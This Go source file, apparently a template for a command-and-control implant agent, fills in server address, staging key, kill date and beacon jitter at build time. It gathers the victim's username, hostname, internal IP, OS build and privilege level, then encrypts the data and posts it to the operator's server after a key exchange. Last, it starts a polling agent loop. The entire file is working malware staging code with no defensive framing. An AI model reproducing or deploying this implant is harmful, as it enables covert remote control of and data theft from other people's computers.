func getSysinfo(server string, nonce string) string {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	processID := os.Getpid()
	language := "go"
	processName := filepath.Base(os.Args[0])
	operatingsystem := runtime.GOOS
	v := w32.RtlGetVersion()
	osDetails := fmt.Sprintf("%s %d Build:%d", operatingsystem, v.MajorVersion, v.BuildNumber)
	internalIP := getIP()
	architecture := runtime.GOARCH
	version := "1.23"

	hi, err := IsHighIntegrity()
	if err != nil {
		hi = false
	}
	highIntegrity := fmt.Sprintf("%t", hi)

	return fmt.Sprintf("%s|%s|%s|%s|%s|%s|%s|%s|%s|%d|%s|%s|%s|",
		nonce, server, "", username, hostname, internalIP, osDetails, highIntegrity, processName, processID,
		language, version, architecture)
}

func getIP() string {
	addrs, _ := net.InterfaceAddrs()
	for _, addr := range addrs {
		if ipNet, ok := addr.(*net.IPNet); ok && !ipNet.IP.IsLoopback() {
			if ipNet.IP.To4() != nil {
				ip := ipNet.IP.String()
				if !strings.HasPrefix(ip, "169.254") {
					return ip
				}
			}
		}
	}
	return ""
}

func IsHighIntegrity() (bool, error) {
	const (
		SECURITY_MANDATORY_HIGH_RID = 0x00003000
	)

	hProc := windows.CurrentProcess()

	var tok windows.Token
	if err := windows.OpenProcessToken(hProc, windows.TOKEN_QUERY, &tok); err != nil {
		return false, err
	}
	defer tok.Close()

	var outLen uint32
	err := windows.GetTokenInformation(tok, windows.TokenIntegrityLevel, nil, 0, &outLen)
	if err != windows.ERROR_INSUFFICIENT_BUFFER {
		return false, err
	}

	buf := make([]byte, outLen)
	if err := windows.GetTokenInformation(tok, windows.TokenIntegrityLevel, &buf[0], outLen, &outLen); err != nil {
		return false, err
	}

	type tokenMandatoryLabel struct {
		Label windows.SIDAndAttributes
	}
	tml := (*tokenMandatoryLabel)(unsafe.Pointer(&buf[0]))
	sid := tml.Label.Sid

	subAuthCount := *(*uint8)(unsafe.Pointer(uintptr(unsafe.Pointer(sid)) + 1))
	lastRID := *(*uint32)(unsafe.Pointer(uintptr(unsafe.Pointer(sid)) + uintptr(8+int(subAuthCount-1)*4)))

	return lastRID >= SECURITY_MANDATORY_HIGH_RID, nil
}

func main() {
	profile := "{{ PROFILE }}"
	server := "{{ HOST }}"
	sessionID := "{{ SESSION_ID }}"
	killDate := "{{ KILL_DATE }}"
	workingHours := "{{ WORKING_HOURS }}"
	delay := {{ DELAY }}
	jitter := {{ JITTER }}
	lostLimit := {{ LOST_LIMIT }}
    stagingKeyBase64 := "{{ STAGING_KEY }}"
	defaultResponse := "{{ DEFAULT_RESPONSE }}"
	sessionCookie := "{{ SESSION_COOKIE }}"
	agent_private_cert_key_encoded := "{{ AGENT_PRIVATE_CERT_KEY }}"
	agent_public_cert_key_encoded := "{{ AGENT_PUBLIC_CERT_KEY }}"
	server_public_cert_key_encoded := "{{ SERVER_PUBLIC_CERT_KEY }}"
{% if MALLEABLE %}
	// Malleable build (`-tags malleable`): parse the JSON profile up front
	// so we can source the stager URIs from it. Plain builds skip this and
	// the comms/malleable.go file is excluded from compilation entirely.
	malleableProfileB64 := "{{ MALLEABLE_PROFILE }}"
	malleableProfile, _ := comms.ParseMalleableProfile(malleableProfileB64)
	stage1URI, stage2URI := comms.ResolveStagerURIs(malleableProfile)
{% else %}
	stage1URI := "/stage1"
	stage2URI := "/stage2"
{% endif %}

	agent_private_cert_key, err := base64.StdEncoding.DecodeString(agent_private_cert_key_encoded)

	if err != nil {
	 	fmt.Println("Error decoding agent private cert key:", err)
		return
	}

	agent_public_cert_key, err := base64.StdEncoding.DecodeString(agent_public_cert_key_encoded)
	if err != nil {
		fmt.Println("Error decoding agent public cert key:", err)
		return
	}

	server_public_cert_key, err := base64.StdEncoding.DecodeString(server_public_cert_key_encoded)
	if err != nil {
		fmt.Println("Error decoding server public cert key:", err)
		return
	}

	stagingKey, err := base64.StdEncoding.DecodeString(stagingKeyBase64)
	if err != nil {
		fmt.Println("Error decoding stagingKey:", err)
		return
	}

	sessionKey, newSessionID, nonce, err := comms.PerformDHKeyExchange(server, stage1URI, sessionID, stagingKey, agent_private_cert_key, agent_public_cert_key, server_public_cert_key)
	if err != nil {
		fmt.Println("Error performing DH key exchange:", err)
		return
	}

	// Update session ID from DH response
	if newSessionID != "" {
		sessionID = newSessionID
	}

	packetHandler := comms.PacketHandler{
		Server:     server,
		StagingKey: stagingKey,
		SessionID:  sessionID,
		Aeskey:     sessionKey,
	}

	// The listener's default page: what it serves for an idle poll, accepted
	// results and a rejected packet on the legacy path.
	defaultPage, err := base64.StdEncoding.DecodeString(defaultResponse)
	if err != nil {
		fmt.Println("Error decoding default response:", err)
		return
	}

	nonceStr := string(nonce)
	nonceInt, _ := new(big.Int).SetString(nonceStr, 10)
	nonceInt.Add(nonceInt, big.NewInt(1))
	nonceStr = nonceInt.String()

	sysInfo := getSysinfo(packetHandler.Server, nonceStr)
	sysInfoBytes := []byte(sysInfo)

	encryptedSysInfo := common.AesEncryptThenHMAC(sessionKey, sysInfoBytes)

	// Build and send routing packet for Stage 2
	routingPacket := packetHandler.BuildRoutingPacket(stagingKey, sessionID, 3, 0, encryptedSysInfo)
	postURL := server + stage2URI
	_, _ = http.Post(postURL, "application/octet-stream", bytes.NewReader(routingPacket))
{% if MALLEABLE %}
	messagesender, err := comms.NewMalleableHttpMessageSender(server, make(map[string]string), profile, malleableProfileB64, sessionCookie, defaultPage)
	if err != nil {
		fmt.Println("Error building message sender:", err)
		return
	}
{% else %}
	messagesender := comms.NewHttpMessageSender(server, make(map[string]string), profile, sessionCookie, defaultPage)
{% endif %}

	newAgent := agent.NewMainAgent(packetHandler, messagesender, sessionID, killDate, workingHours, delay, jitter, lostLimit, sessionKey)

	go newAgent.Run()

	select {}
}
